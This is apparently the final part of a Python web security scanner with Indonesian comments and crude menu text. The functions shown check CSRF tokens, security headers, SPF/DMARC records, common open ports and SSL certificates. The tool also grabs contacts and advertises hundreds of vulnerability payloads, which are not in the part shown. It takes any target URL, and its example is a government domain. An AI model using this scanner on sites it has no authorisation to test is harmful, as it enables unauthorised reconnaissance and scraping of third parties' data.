                    'Missing CSRF token',
                    'Sedang',
                    'Implementasikan CSRF tokens untuk semua form. Gunakan SameSite cookies.',
                    url=self.target
                )
                
        except Exception as e:
            print(f"{Warna.M}[-] Error scanning CSRF: {str(e)}{Warna.RESET}")
    
    def scan_headers(self):
        """Scan security-related HTTP headers"""
        print(f"{Warna.K}[*] Memulai Security Headers Scan...{Warna.RESET}")
        
        try:
            response = self.sesi.get(self.target, timeout=self.config['timeout'])
            headers = response.headers
            
            # Daftar header keamanan yang penting
            security_headers = {
                'X-XSS-Protection': '1; mode=block',
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'DENY or SAMEORIGIN',
                'Content-Security-Policy': '',
                'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
                'Referrer-Policy': 'no-referrer-when-downgrade',
                'Feature-Policy': '',
                'Permissions-Policy': ''
            }
            
            missing_headers = [h for h in security_headers if h not in headers]
            
            if missing_headers:
                self._add_vulnerability(
                    'Missing Security Headers',
                    'HTTP Headers',
                    ', '.join(missing_headers),
                    'Rendah',
                    'Tambahkan security headers yang direkomendasikan untuk meningkatkan keamanan.',
                    url=self.target
                )
                
        except Exception as e:
            print(f"{Warna.M}[-] Error scanning headers: {str(e)}{Warna.RESET}")
    
    def scan_dns(self):
        """Scan DNS-related vulnerabilities"""
        print(f"{Warna.K}[*] Memulai DNS Scan...{Warna.RESET}")
        
        try:
            domain = urlparse(self.target).netloc
            if ':' in domain:  # Remove port if present
                domain = domain.split(':')[0]
                
            # Cek SPF record
            try:
                answers = dns.resolver.resolve(domain, 'TXT')
                spf_found = any('v=spf1' in str(r) for r in answers)
                if not spf_found:
                    self._add_vulnerability(
                        'Missing SPF Record',
                        'DNS TXT',
                        'No SPF record found',
                        'Rendah',
                        'Tambahkan SPF record untuk mencegah email spoofing.',
                        url=f"dns:{domain}"
                    )
                    
            except dns.resolver.NoAnswer:
                self._add_vulnerability(
                    'Missing SPF Record',
                    'DNS TXT',
                    'No SPF record found',
                    'Rendah',
                    'Tambahkan SPF record untuk mencegah email spoofing.',
                    url=f"dns:{domain}"
                )
                
            # Cek DMARC record
            try:
                answers = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
                dmarc_found = any('v=DMARC1' in str(r) for r in answers)
                if not dmarc_found:
                    self._add_vulnerability(
                        'Missing DMARC Record',
                        'DNS TXT',
                        'No DMARC record found',
                        'Rendah',
                        'Tambahkan DMARC record untuk meningkatkan email security.',
                        url=f"dns:_dmarc.{domain}"
                    )
                    
            except dns.resolver.NXDOMAIN:
                self._add_vulnerability(
                    'Missing DMARC Record',
                    'DNS TXT',
                    'No DMARC record found',
                    'Rendah',
                    'Tambahkan DMARC record untuk meningkatkan email security.',
                    url=f"dns:_dmarc.{domain}"
                )
                
        except Exception as e:
            print(f"{Warna.M}[-] Error scanning DNS: {str(e)}{Warna.RESET}")
    
    def scan_ports(self):
        """Scan open ports on target"""
        print(f"{Warna.K}[*] Memulai Port Scanning...{Warna.RESET}")
        
        try:
            domain = urlparse(self.target).netloc
            if ':' in domain:  # Remove port if present
                domain = domain.split(':')[0]
                
            # Port umum yang akan di-scan
            common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 8080, 8443, 3306, 3389]
            open_ports = []
            
            for port in common_ports:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((domain, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(str(port))
            
            if open_ports:
                self._add_vulnerability(
                    'Open Ports',
                    'Network',
                    ', '.join(open_ports),
                    'Rendah',
                    'Tutup port yang tidak diperlukan. Gunakan firewall untuk membatasi akses.',
                    url=f"network:{domain}"
                )
                
        except Exception as e:
            print(f"{Warna.M}[-] Error scanning ports: {str(e)}{Warna.RESET}")
    
    def check_ssl_config(self):
        """Check SSL/TLS configuration"""
        print(f"{Warna.K}[*] Memulai SSL/TLS Scan...{Warna.RESET}")
        
        try:
            domain = urlparse(self.target).netloc
            if ':' in domain:  # Remove port if present
                domain = domain.split(':')[0]
                
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                    # Cek sertifikat SSL
                    cert_issues = []
                    if not cert:
                        cert_issues.append('No certificate presented')
                    else:
                        # Cek expiry date
                        expiry_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        if expiry_date < datetime.now():
                            cert_issues.append('Certificate expired')
                            
                        # Cek subjectAltName
                        san = False
                        for field in cert['subjectAltName']:
                            if domain in field[1] or f'.{domain}' in field[1]:
                                san = True
                                break
                        if not san:
                            cert_issues.append('Missing proper subjectAltName')
                    
                    # Cek cipher
                    cipher_issues = []
                    if cipher[0] in ['RC4', 'DES', '3DES', 'CBC']:
                        cipher_issues.append(f'Weak cipher: {cipher[0]}')
                    
                    if cert_issues or cipher_issues:
                        self._add_vulnerability(
                            'SSL/TLS Issues',
                            'HTTPS',
                            f"Cert issues: {', '.join(cert_issues)}. Cipher issues: {', '.join(cipher_issues)}",
                            'Sedang',
                            'Perbarui sertifikat SSL. Gunakan cipher yang kuat. Konfigurasi ulang server web.',
                            url=f"https://{domain}"
                        )
                        
        except Exception as e:
            self._add_vulnerability(
                'SSL/TLS Error',
                'HTTPS',
                str(e),
                'Sedang',
                'Perbaiki konfigurasi SSL/TLS. Gunakan sertifikat yang valid dari CA terpercaya.',
                url=f"https://{domain}"
            )
    
    def _get_testable_urls(self):
        """Dapatkan URL yang bisa di-test dari target"""
        urls = [self.target]
        
        try:
            # Dapatkan semua link dari halaman utama
            response = self.sesi.get(self.target, timeout=self.config['timeout'])
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith('http') and self.target in href:
                    urls.append(href)
                elif href.startswith('/'):
                    urls.append(f"{self.target.rstrip('/')}{href}")
                    
        except Exception:
            pass
            
        return list(set(urls))[:self.config['scan_depth']]  # Batasi jumlah URL yang discan
    
    def _add_vulnerability(self, jenis, parameter, payload, tingkat, solusi, url=""):
        """Tambahkan kerentanan ke daftar temuan"""
        self.temuan.append({
            'jenis': jenis,
            'parameter': parameter,
            'payload': payload,
            'tingkat': tingkat,
            'solusi': solusi,
            'url': url
        })
        print(f"{Warna.H}[+] {jenis} ditemukan di parameter {parameter} (URL: {url}){Warna.RESET}")
    
    def run_extreme_scan(self):
        """Menjalankan semua pemeriksaan"""
        self.create_report_dir()
        
        # Jalankan semua fitur secara parallel
        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
            futures = [
                executor.submit(self.grab_contacts),
                executor.submit(self.run_security_scan),
                executor.submit(self.check_ssl_config)
            ]
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Warna.M}[-] Error: {str(e)}{Warna.RESET}")
        
        # Simpan laporan keamanan yang lebih lengkap
        self._save_security_report()
        
        print(f"\n{Warna.H}[+] DAH KELARR ANJ TINGGAL CEK!{Warna.RESET}")
        print(f"{Warna.K}Laporan Disimpen Di Folder ini anj: {self.report_dir}{Warna.RESET}")

# ===== MENU UTAMA =====
def main():
    clear_screen()
    print(BANNER)
    
    while True:
        print(f"\n{Warna.C}[+] MENU UTAMA:{Warna.RESET}")
        print(f"1. EXTREME SCAN BRUTALL MODE")
        print(f"2. Minim literasi??gakusah baca ini")
        print(f"3. Cabut")
    
        try:
            pilihan = input(f"{Warna.K}>>> Mau nomor berapa??: {Warna.P}").strip()
        
            if pilihan == "1":
                target = input(f"{Warna.K}Masukkan web target(contoh: https://jokowimulyono.go.id): {Warna.P}").strip()
                if not target.startswith(('http://', 'https://')):
                    target = 'http://' + target
            
                print(f"\n{Warna.U}=== WETT SABAR ANJ LAGI DI ACAK ACAK ==={Warna.RESET}")
                scanner = ExtremeScanner(target)
                scanner.run_extreme_scan()
            
            elif pilihan == "2":
                print(f"\n{Warna.U}=== TENTANG PETSUITE ENHANCED V20 ==={Warna.RESET}")
                print("Tools keamanan web paling lengkap dengan:")
                print("- 700+ payload kerentanan")
                print("- Contact grabbing otomatis")
                print("- Laporan HTML dan TXT")
                print("- Deteksi parameter vulnerable")
                print("\nDibuat untuk tujuan pendidikan ethical hacking")
                print(f"By: Petrus1sec | {Warna.C}github.com/Bimagacorkang{Warna.RESET}")
            
            elif pilihan == "3":
                print(f"\n{Warna.H}[+] Makasih Udah Gunain Tools gw🥰😘{Warna.RESET}")
                sys.exit(0)
        
            else:
                print(f"{Warna.M}[!] Pilihan Lu Gak Valid anjeng{Warna.RESET}")
            
        except KeyboardInterrupt:
            print(f"\n{Warna.M}[!] Tools Nya di matiin{Warna.RESET}")
            sys.exit(1)

if __name__ == "__main__":
    # Buat folder reports jika belum ada
    os.makedirs("reports", exist_ok=True)
    main()
